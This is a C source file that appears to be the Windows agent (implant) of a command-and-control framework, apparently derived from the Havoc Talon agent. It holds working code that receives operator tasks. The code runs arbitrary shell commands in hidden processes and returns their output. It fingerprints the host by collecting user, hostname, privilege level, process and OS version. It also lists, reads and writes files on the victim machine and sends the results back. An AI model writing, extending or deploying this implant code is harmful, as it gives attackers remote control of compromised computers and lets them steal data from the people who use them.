#include <lmcons.h>

#include <windows_utils.h>

#include <stdio.h>
#include <types.h>
#include <communication.h>
#include <commands.h>
#include <utils.h>

#define COMMAND_COUNT 7

Command commands[COMMAND_COUNT] = {
  {.id = 0, .function = identifyCmd },
  {.id = 7, .function = shellCmd },
  
  // fs 
  {.id = 100, .function = fsDirCmd },
  {.id = 101, .function = fsOpenFileCmd },
  {.id = 102, .function = fsWriteFileCmd },
  {.id = 103, .function = fsCloseFileCmd },
  {.id = 104, .function = fsReadFileCmd }
};

void executeCmd(int taskActionId, int taskId, int argc, struct TLVBuild * tlv) {
  printf("[+] Got task ID: %u\n", taskId);
  printf("    -> CommandId: %u\n", taskActionId); 
  
  for (int i = 0; i < COMMAND_COUNT; i++)
    if (taskActionId == commands[i].id)
      commands[i].function(taskId, argc, tlv);
}

void shellCmd(int taskId, int argc, struct TLVBuild * tlv) {
  if (argc < 1) return;
  struct TLVBuild out = allocStruct(50);

  char * cmd;
  extractAllocString(tlv, &cmd);

  /**
   * https://github.com/HavocFramework/Talon/blob/main/Agent/Source/Command.c
   */

  HANDLE hStdInPipeRead = NULL;
  HANDLE hStdInPipeWrite = NULL;
  HANDLE hStdOutPipeRead = NULL;
  HANDLE hStdOutPipeWrite = NULL;

  PROCESS_INFORMATION ProcessInfo = { 0 };
  SECURITY_ATTRIBUTES SecurityAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
  STARTUPINFOA StartUpInfoA = { 0 };

  if (!CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0))
    return;

  if (!CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0))
    return;

  StartUpInfoA.cb = sizeof(STARTUPINFOA);
  StartUpInfoA.dwFlags = STARTF_USESTDHANDLES;
  StartUpInfoA.hStdError = hStdOutPipeWrite;
  StartUpInfoA.hStdOutput = hStdOutPipeWrite;
  StartUpInfoA.hStdInput = hStdInPipeRead;

  if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartUpInfoA, &ProcessInfo))
  { sendData(taskId, "output", "Failed to create process", 0, NULL);
    return; }
  
  CloseHandle(hStdOutPipeWrite);
  CloseHandle(hStdInPipeRead);

  LPVOID pOutputBuffer = NULL;
  DWORD dwBufferSize = 0;
  DWORD dwRead = 0;
  UCHAR buf[1025] = { 0 };
  BOOL SuccessFul = FALSE;

  pOutputBuffer = LocalAlloc(LPTR, sizeof(LPVOID));

  do {
    SuccessFul = ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL);

    if (dwRead == 0) break;

    pOutputBuffer = LocalReAlloc(
      pOutputBuffer,
      dwBufferSize + dwRead,
      LMEM_MOVEABLE | LMEM_ZEROINIT
    );

    memcpy(pOutputBuffer + dwBufferSize, buf, dwRead);
    memset(buf, 0, dwRead);

    dwBufferSize += dwRead;
  } while (SuccessFul);

  addBytes(&out, false, dwBufferSize, pOutputBuffer);

  memset(pOutputBuffer, 0, dwBufferSize);
  LocalFree(pOutputBuffer);
  pOutputBuffer = NULL;

  sendOutput(taskId, out);

  CloseHandle(hStdOutPipeRead);
  CloseHandle(hStdInPipeWrite);

  free(cmd);
  free(out.buf);
}

void identifyCmd(int taskId, int argc, struct TLVBuild * tlv) {
  printf("[+] agent is identifying..\n");
  
  struct TLVBuild identifyMessage = allocStruct(50);

  char * username = malloc(UNLEN + 1);
  char * hostname = malloc(UNLEN + 1);
  char * processName = malloc(260);

  OSVERSIONINFOEXW osinfo;
  DWORD usernameLen = UNLEN + 1;
  DWORD hostnameLen = UNLEN + 1;
  DWORD pid;

  pid = GetProcessId(GetCurrentProcess());
  GetUserNameA(username, &usernameLen);
  GetComputerNameA(hostname, &hostnameLen);
  getProcessName(pid, processName);
  agent.functions.RtlGetVersion(&osinfo);

  addString (&identifyMessage, username);
  addString (&identifyMessage, hostname);
  addByte   (&identifyMessage, (char)isProcessElevated());
  addString (&identifyMessage, "windows");
  addInt32  (&identifyMessage, pid);
  addString (&identifyMessage, processName);
  addInt32  (&identifyMessage, osinfo.dwMajorVersion);
  addInt32  (&identifyMessage, osinfo.dwMinorVersion);
  addInt32  (&identifyMessage, osinfo.dwBuildNumber);

  sendData(
    taskId,
    "identify",
    "",
    identifyMessage.bufsize, 
    identifyMessage.buf
  );
  
  free(username);
  free(hostname);
  free(processName);
  free(identifyMessage.buf);
}

void fsDirCmd(int taskId, int argc, struct TLVBuild * tlv) {
  printf("listing files\n");

  struct TLVBuild response = allocStruct(50);
  struct TLVBuild file_list = allocStruct(50);
  
  WIN32_FIND_DATA fdFile;
  HANDLE hFile;
  
  int files = 0;
  char * path;
  
  if (argc > 0) extractAllocString(tlv, &path);
  else path = ".\\*";
  
  if (hFile = FindFirstFile(path, &fdFile)) {

    do {
      if (fdFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        addByte(&file_list, 1);
      else 
        addByte(&file_list, 0);
      addString(&file_list, fdFile.cFileName);
      files++;
    } while (FindNextFile(hFile, &fdFile));

  }

  addInt32(&response, files);
  addBytes(&response, false, file_list.bufsize, file_list.buf);

  sendOutput(taskId, response);

  free(response.buf);
  free(file_list.buf);
  if (argc > 0) free(path);
}

void fsOpenFileCmd(int taskId, int argc, struct TLVBuild * tlv) {
  if (argc < 1) return;
  
  HANDLE fileHandle;
  struct TLVBuild output = allocStruct(50);
  int fileHandleIndex;
  int success = 0;
  int save_file_size = 0;
  char * file_path;
  char * open_for;
  LARGE_INTEGER file_size;
  extractAllocString(tlv, &open_for);
  extractAllocString(tlv, &file_path);

  printf("Opening file %s for %s\n", file_path, open_for);
  
  if (strcmp(open_for, "w") == 0) 
  {
    printf("Opening file for writing\n");
    fileHandle = CreateFile(
      file_path, GENERIC_WRITE, 0, NULL, 
      CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL
    );

    if (fileHandle == INVALID_HANDLE_VALUE)
    { printf("Couldn't open file %ld\n", GetLastError()); 
      goto _openFileCmd_cleanup; }

  }
  else if (strcmp(open_for, "r") == 0)
  {
    fileHandle = CreateFile(file_path,               // file to open
      GENERIC_READ,          // open for reading
      FILE_SHARE_READ,       // share for reading
      NULL,                  // default security
      OPEN_EXISTING,         // existing file only
      FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, // normal file
      NULL
    );

    if (fileHandle == INVALID_HANDLE_VALUE)
    { printf("Couldn't open file %ld\n", GetLastError()); 
      goto _openFileCmd_cleanup; }

    if (!GetFileSizeEx(fileHandle, &file_size))
    { printf("Couldn't get file size\n");
      goto _openFileCmd_cleanup; }

    printf("File size %ld\n", file_size.QuadPart);

    if (file_size.QuadPart > 4000000000) 
    { printf("Can't read files larger than 4GB.\n");
      goto _openFileCmd_cleanup; }

    save_file_size = 1;

  }
  else goto _openFileCmd_cleanup;

  for (fileHandleIndex = 0; fileHandleIndex < 100; fileHandleIndex++)
    if (agent.fileHandles[fileHandleIndex] == 0) break;

  agent.fileHandles[fileHandleIndex] = fileHandle;
  success = 1;

_openFileCmd_cleanup:
  if (!success) addInt32(&output, -1);
  else {
    addInt32(&output, fileHandleIndex);
    if (save_file_size) addInt32(&output, (int)file_size.QuadPart);
  }

  sendOutput(taskId, output);
  free(file_path);
  free(open_for);
  free(output.buf);
}

void fsWriteFileCmd(int taskId, int argc, struct TLVBuild * tlv) {
  // if (argc < 2) return;
  printf("writing to file\n");
  struct TLVBuild output = allocStruct(50);
  int success = 0;
  int handleId = extractInt32(tlv);
  int bufSize = extractInt32(tlv);
  char * buf = malloc(bufSize);

  HANDLE fileHandle = agent.fileHandles[handleId];
  DWORD bytesWrittten;
  
  if (isHandleValid(handleId)) {
    extractBytes(tlv, bufSize, buf);

    if (WriteFile(fileHandle, buf, bufSize, &bytesWrittten, NULL)) success = 1;
    else printf("Error writting file.\n");
  } else {
    printf("Got invalid handle\n");
  }

  addInt32(&output, success);
  sendOutput(taskId, output);

  free(buf);
  free(output.buf);
}

void fsReadFileCmd(int taskId, int argc, struct TLVBuild * tlv) 
{
  // if (argc < 2) return;
  printf("read file\n");
  struct TLVBuild output = allocStruct(50);
  int success = 1;
  int handleId = extractInt32(tlv);
  int bufSize = extractInt32(tlv);
  char * buf = malloc(bufSize);

  HANDLE fileHandle;
  DWORD bytesRead = 0;

  if (isHandleValid(handleId)) 
  {
    fileHandle = agent.fileHandles[handleId];
    if (!ReadFile(fileHandle, buf, bufSize, &bytesRead, NULL)) 
    {
      printf("Error reading file %ld\n", GetLastError());
      success = -1;
    }
  } else 
  {
    printf("Got invalid handle.\n");
    success = -1;
  };

  addInt32(&output, success);
  addBytes(&output, true, bytesRead, buf);
  sendOutput(taskId, output);

  free(buf);
  free(output.buf);
}

void fsCloseFileCmd(int taskId, int argc, struct TLVBuild * tlv) 
{
  // if (argc < 2) return;
  printf("closing file\n");
  struct TLVBuild output = allocStruct(5);
  int success = 1;
  int handleId = extractInt32(tlv);
  
  HANDLE fileHandle = agent.fileHandles[handleId];
  CloseHandle(fileHandle);

  addInt32(&output, 1);
  sendOutput(taskId, output);

  free(output.buf);
}